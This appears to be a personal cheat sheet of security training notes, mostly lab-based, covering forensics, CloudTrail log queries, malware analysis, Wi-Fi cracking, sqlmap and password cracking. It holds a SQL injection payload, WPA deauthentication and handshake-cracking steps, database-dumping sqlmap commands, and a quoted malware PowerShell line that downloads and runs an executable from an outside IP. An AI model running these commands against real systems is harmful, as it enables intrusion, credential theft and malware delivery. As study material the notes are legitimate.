toadd

—-

SQLi ;
-  UNION ALL SELECT group_concat(column_name),null,null,null,null FROM information_schema.columns WHERE table_name="people"
- 

———

MITM tools:
ettercap - https://www.ettercap-project.org/
bettercap - https://www.bettercap.org/


———

OSINT:
Site Analyzer: https://pagespeed.web.dev/
https://web.dev/measure/


———
Open Source IDS: snort

run on loopback interface: `sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf`
run on captured packet file: `sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf`


Vulnerability Scanners:
- Nessus: https://www.tenable.com/products/nessus
- Qualys: https://qualys.com/
- ISS Scanner
- Acunetix
- Nexpose: https://www.rapid7.com/products/nexpose/
- OpenVAS: https://www.openvas.org/
- Psalm - static analysis : https://psalm.dev/docs/running_psalm/installation/
- Greenbone (community edition), 
- OWASP ZAP



SSDLC:
- https://owasp.org/www-project-samm/
- https://owaspsamm.org/blog/2020/10/29/comparing-bsimm-and-samm/


———

Various links:

vagrant samples: https://github.com/MWR-CyberSec/tabletop-lab-creation

MITRE ATT&CK navigator: https://mitre-attack.github.io/attack-navigator/



payloads all things: https://github.com/swisskyrepo/PayloadsAllTheThings
All the repo : https://github.com/swisskyrepo


enumerate privilege escalations: https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
enumerate privilege escalations windows: https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

pentestmonkey: https://github.com/pentestmonkey?tab=repositories


Living of the land: https://lolbas-project.github.io/

Crypto analysis : https://www.quipqiup.com/


cli commands: https://ss64.com

———



——

.NET binary reversing: 
1. Check details using PEStudio without running the binary
    1. Record the hash of binary, .text section so that it cannot be modified during analysis
    2. Check indicators for useful information
    3. 
2. 

PE format: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
ILSpy: https://github.com/icsharpcode/ILSpy 
Windows Registry: https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/windows-registry-advanced-users

——

Malicious file Analysis:

Oledump.py : https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py
- run analysis: oledump.py agenttesla.xlsm
- Select data stream 4th: oledump.py agenttesla.xlsm -s 4
- Show the output in readable format: oledump.py agenttesla.xlsm -s 4 --vbadecompress


"powershell -WindowStyle hidden -executionpolicy bypass; $TempFile = [IO.Path]::GetTempFileName() | Rename-Item -NewName { $_ -replace 'tmp$', 'exe' }  PassThru; Invoke-WebRequest -Uri ""http://193.203.203.67/rt/Doc-3737122pdf.exe"" -OutFile $TempFile; Start-Process $TempFile;"



—
CAPA: Common Analysis Platform for Artifacts
Results formats:
- MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) - https://attack.mitre.org/
- MAEC (Malware Attribute Enumeration and Characterization) - http://maecproject.github.io/
- MBC - Malware Behavior Catalogue - https://github.com/MBCProject/mbc-markdown/blob/main/mbc_summary.md
- namespaces: https://github.com/MBCProject/capa-rules-1?tab=readme-ov-file#namespace-organization
- Capabilities : rule names that is matched
- CAPA explorer: view json file in human readable format: https://mandiant.github.io/capa/explorer/#/
- 
- 






——

Network analysis: 
INetSim: Internet Services Simulation Suite!
Simulate network traffics


—————

Analysing memory dump:
volitality3:  vol3 -f <memory image> <plugin name>
https://volatilityfoundation.org/
https://github.com/volatilityfoundation/volatility3

Available plugins to use: https://volatility3.readthedocs.io/en/stable/volatility3.plugins.html


——————

—————

azure command
 syntax: az GROUP SUBGROUP ACTION OPTIONAL_PARAMETERS
az ad user list --filter "startsWith('wvusr-', displayName)"
az ad user list --filter "startsWith('wvusr-', displayName)"
az ad group list
az ad group member list --group "Secret Recovery Group"
az role assignment list --assignee REPLACE_WITH_GROUP_ID --all


———


Wifi cracking


1. Check wireless interface: `iw dev`
2. scan nearby wifi devices: sudo iw dev wlan2 scan
3. Set to monitor/promiscious mode: 
    1. sudo ip link set dev wlan2 down
    2. sudo iw dev wlan2 set type monitor
    3. sudo ip link set dev wlan2 up
4. Check the status: sudo iw dev wlan2 info
5. List nearby wife details: sudo airodump-ng wlan2
6. capture the 4-way handshake: sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
7. send deauth packet: sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
8. Crack the 4-way handshake: sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap
9. Save the wireless config : wpa_passphrase MalwareM_AP ‘wifi-password’ > config
10. use the config to connect to wifi: sudo wpa_supplicant -B -c config -i wlan2
11. 

————



SQLMap - sql injection tool
analyse: sqlmap -u http://sqlmaptesting.thm/search/cat=1
get databases: sqlmap -u http://sqlmaptesting.thm/search/cat=1 —dbs
get tables inside database: sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
get records from the table: sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump


Event ID	Description
4624	A user account successfully logged in
4625	A user account failed to login
4634	A user account successfully logged off
4720	A user account was created
4724	An attempt was made to reset an account’s password
4722	A user account was enabled
4725	A user account was disabled
4726	A user account was deleted


digital forensics:
* FTK Imager
* autopsy: https://www.autopsy.com/
* dumpit: https://www.toolwar.com/2014/01/dumpit-memory-dump-tools.html
* volatility: https://volatilityfoundation.org/

————

search hashes:
https://crackstation.net/
https://hashes.com/en/decrypt/hash


recognize hashes:
https://pypi.org/project/hashID/
https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master
https://hashes.com/en/tools/hash_identifier
https://hashcat.net/wiki/doku.php?id=example_hashes
https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py


hash crack:
https://www.openwall.com/john/
https://hashcat.net/hashcat/ - hashcat -m <hash_type> -a <attack_mode> hashfile wordlist 
https://hashcat.net/wiki/doku.php?id=example_hashes - to check hash type

md5 collision: https://www.mscs.dal.ca/~selinger/md5collision/
sha1 collision: https://shattered.io/


john
https://www.openwall.com/john/

1. Search format name supported by john: john --list=formats | grep -iF 'sha256' 
2. john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
3. john --single --format=raw-sha256 hash07.txt (hash syntax: ‘username:hash’)
4. generate unix hashs in john compatible format: unshadow local_passwd local_shadow > unshad
5. Add custom rule in `/etc/john/john.conf` - https://www.openwall.com/john/doc/RULES.shtml
    * Az: Takes the word and appends it with the characters you define
    * A0: Takes the word and prepends it with the characters you define
    * c: Capitalises the character positionally
* 


man 5 shadow
man 5 crypt



—————



Internet device search (servers, routers, webcams, and IoT devices): https://www.shodan.io/, https://www.shodan.io/search/examples, https://trends.shodan.io/
Internet hosts, websites, assets: https://search.censys.io/, https://support.censys.io/hc/en-us/articles/20720064229140-Censys-Search-Use-Cases
malware search: https://www.virustotal.com/
check email id for breach: https://haveibeenpwned.com/



SWIFT CSP

https://learn.microsoft.com/en-us/windows-hardware/drivers/driversecurity/threat-modeling-for-drivers#the-dread-approach-to-threat-assessment


```

Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose
Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose


jq -r '["Event_Time", "Event_Name", "User_Name", "Bucket_Name", "Key", "Source_IP"],(.Records[] | select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares") | [.eventTime, .eventName, .userIdentity.userName // "N/A",.requestParameters.bucketName // "N/A", .requestParameters.key // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t


jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

jq -r '["Event_Time", "Event_type", "Event_Name", "User_Name", "Source_IP", "User_Agent"],(.Records[] | select(.userIdentity.userName == "glitch") | [.eventTime,.eventType, .eventName, .userIdentity.userName //"N/A",.sourceIPAddress //"N/A", .userAgent //"N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.eventSource == "iam.amazonaws.com") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

jq '.Records[] |select(.eventSource=="iam.amazonaws.com" and .eventName== "CreateUser")' cloudtrail_log.json

jq '.Records[] |select(.eventSource=="iam.amazonaws.com" and .eventName== "ConsoleLogin")' cloudtrail_log.json


jq '.Records[] | select(.eventSource=="iam.amazonaws.com" and .eventName== "AttachUserPolicy")' cloudtrail_log.json

 jq -r '["Event_Time", "Event_Source", "Event_Name", "User_Name", "Source_IP"], (.Records[] | select(.sourceIPAddress=="53.94.201.69") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A", .sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'


jq -r '["Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"],(.Records[] | select(.userIdentity.userName=="mcskidy") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A",.userAgent // "N/A",.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

jq -r '["Event_Time","Event_Source","Event_Name", "User_Name","User_Agent","Source_IP"],(.Records[] | select(.userIdentity.userName=="mayor_malware") | [.eventTime, .eventSource, .eventName, .userIdentity.userName // "N/A",.userAgent // "N/A",.sourceIPAddress // "N/A"]) | @tsv' cloudtrail_log.json | column -t -s $'\t'

—

Login using RDP
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'TryH4ckM3!'
